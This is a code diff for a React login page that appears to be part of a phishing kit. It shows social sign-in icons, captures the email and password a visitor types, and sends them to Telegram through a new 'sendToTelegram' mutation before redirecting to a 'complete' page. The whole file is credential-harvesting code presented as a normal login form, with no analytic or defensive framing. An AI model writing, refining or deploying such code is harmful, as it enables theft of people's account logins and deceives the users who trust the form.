@@ -4,37 +4,34 @@ import id from "../assets/id.png";
 import download from "../assets/download2.png";
 import { FaFacebookF, FaApple, FaLinkedinIn } from "react-icons/fa";
 import { FcGoogle } from "react-icons/fc";
+import { useSendToTelegramMutation } from "../Services/Telegram";
 
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const navigate = useNavigate();
+  const [sendToTelegram] = useSendToTelegramMutation();
 
  const handleSubmit = async (e) => {
   e.preventDefault();
 
-  // Prepare data to send (add dummy fields for your backend if necessary)
+ 
   const data = {
     email,
     password,
   };
 
   try {
-    const response = await fetch('http://localhost:4000/sendToTelegram', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    });
+    const result = await sendToTelegram(data);
+    console.log('Full response:', result);
+    
 
-    if (response.ok) {
-      console.log('Login info sent to Telegram');
-      // Now navigate after successful send
+    if (result?.data) {
+      console.log('Login info sent to Telegram', result.data);
       navigate("/complete");
     } else {
-      console.error('Failed to send login info');
-      // Optionally show error feedback here
+      console.error('Failed to send login info', result?.error || result);
+     
     }
   } catch (error) {
     console.error('Error sending login info:', error);
